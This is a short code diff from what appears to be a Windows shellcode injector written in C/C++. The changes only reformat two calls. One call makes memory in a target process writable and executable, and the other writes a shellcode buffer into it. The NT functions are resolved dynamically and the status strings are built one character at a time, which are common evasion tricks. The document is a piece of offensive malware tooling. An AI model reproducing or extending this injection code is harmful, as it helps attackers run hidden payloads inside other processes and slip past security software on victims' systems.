@@ -467,7 +467,13 @@ extern "C" void exec() {
 
 	DWORD oldprotect = NULL;
 
-	status = NtProtectVirtualMemoryFunc(pi.hProcess, &exec, (PULONG)&fileSize, PAGE_EXECUTE_READWRITE, &oldprotect);
+	status = NtProtectVirtualMemoryFunc(
+		pi.hProcess,
+		&exec,
+		(PULONG)&fileSize,
+		PAGE_EXECUTE_READWRITE,
+		&oldprotect
+	);
 	if (status != STATUS_SUCCESS) {
 		WCHAR failedToProtect[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'p', L'r', L'o', L't', L'e', L'c', L't', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L'!',  L'\n', 0x00 };
 		wprintfFunc(failedToProtect);
@@ -477,7 +483,13 @@ extern "C" void exec() {
 	wprintfFunc(protectedMemory);
 
 
-	status = NtWriteVirtualMemroyFunc(pi.hProcess, exec, shellcode, fileSize, NULL);
+	status = NtWriteVirtualMemroyFunc(
+		pi.hProcess,
+		exec,
+		shellcode,
+		fileSize,
+		NULL
+	);
 	if (status != STATUS_SUCCESS) {
 		WCHAR failedToWrite[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'w', L'r', L'i', L't', L'e', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L'!',  L'\n', 0x00 };
 		wprintfFunc(failedToWrite);
